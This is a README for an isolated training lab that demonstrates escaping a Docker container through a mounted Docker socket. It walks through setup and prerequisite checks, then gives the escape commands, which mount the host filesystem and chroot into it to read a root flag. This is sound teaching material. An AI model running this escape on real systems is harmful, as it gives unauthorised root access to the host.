# Docker Escape Ad-Hoc Scenario

This isolated lab uses Docker-in-Docker so exploitation commands work even when the main HackLabs container does not expose `/var/run/docker.sock`.

## Start

```bash
docker compose -f docker-compose.docker-escape.yml up -d --build
```

## Enter victim container

```bash
docker exec -it hacklabs-escape-victim sh
```

## Validate prerequisites (inside victim)

```bash
ls /.dockerenv
ls -la /var/run/docker.sock
curl --unix-socket /var/run/docker.sock http://localhost/_ping
```

Expected `_ping` response: `OK`

## Socket escape commands (inside victim)

```bash
docker run -v /:/hostfs --rm -it alpine chroot /hostfs sh
cat /root/root.txt
```

## Stop and clean

```bash
docker compose -f docker-compose.docker-escape.yml down -v
```
